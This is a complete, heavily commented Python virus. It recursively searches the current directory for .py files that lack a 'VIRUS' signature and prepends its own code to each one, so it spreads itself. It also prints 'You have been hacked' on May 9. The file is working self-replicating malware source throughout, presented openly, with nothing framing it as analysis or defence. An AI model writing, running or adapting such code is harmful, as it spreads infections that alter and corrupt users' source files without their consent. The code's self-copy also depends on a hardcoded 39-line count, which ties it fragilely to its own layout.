#!/usr/bin/python3
# This line specifies the interpreter to be used for executing the script.

import os
import datetime

# Define a signature that will be used to identify infected files.
SIGNATURE = "VIRUS"

# Function: locate
# Purpose: Recursively search for Python files (.py) in a given directory and its subdirectories.
# Parameters: path - the directory path to start the search
# Returns: a list of Python files that haven't been infected
def locate(path):
    files_targeted = []  # Initialize an empty list to store targeted files
    filelist = os.listdir(path)  # Get a list of files and directories in the specified path
    for fname in filelist:  # Iterate through the files and directories
        if os.path.isdir(path+"/"+fname):  # Check if the current item is a directory
            files_targeted.extend(locate(path+"/"+fname))  # Recursively call locate on subdirectories
        elif fname[-3:] == ".py":  # Check if the file ends with ".py" (Python file)
            infected = False  # Flag to track if the file is infected
            for line in open(path+"/"+fname):  # Iterate through lines in the file
                if SIGNATURE in line:  # Check if the virus signature is already present in the file
                    infected = True  # Set infected flag to True
                    break  # Exit the loop if the signature is found
            if infected == False:  # If the file is not infected
                files_targeted.append(path+"/"+fname)  # Add the file to the list of targeted files
    return files_targeted  # Return the list of Python files that haven't been infected

# Function: infect
# Purpose: Infects targeted Python files with the virus code.
# Parameters: files_targeted - list of Python files that need to be infected
# Returns: None
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))  # Open the current script file
    virusstring = ""
    for i, line in enumerate(virus):  # Iterate through lines in the virus code
        if 0 <= i < 39:  # Capture the first 39 lines of the virus code
            virusstring += line  # Append each line to virusstring
    virus.close()  # Close the virus file
    for fname in files_targeted:  # Iterate through targeted files
        f = open(fname)  # Open the targeted file
        temp = f.read()  # Read the content of the targeted file
        f.close()  # Close the targeted file
        f = open(fname, "w")  # Reopen the targeted file in write mode
        f.write(virusstring + temp)  # Write virus code followed by original content to the file
        f.close()  # Close the targeted file

# Function: detonate
# Purpose: Checks the current date and triggers a message if the date is May 9th.
# Parameters: None
# Returns: None
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:  # Check if the date is May 9th
        print("You have been hacked")  # Print a message if the condition is met

# Search for Python files in the current directory and its subdirectories
files_targeted = locate(os.path.abspath(""))
# Infect the identified Python files with the virus code
infect(files_targeted)
# Check if the current date is May 9th and print a message if it is
detonate()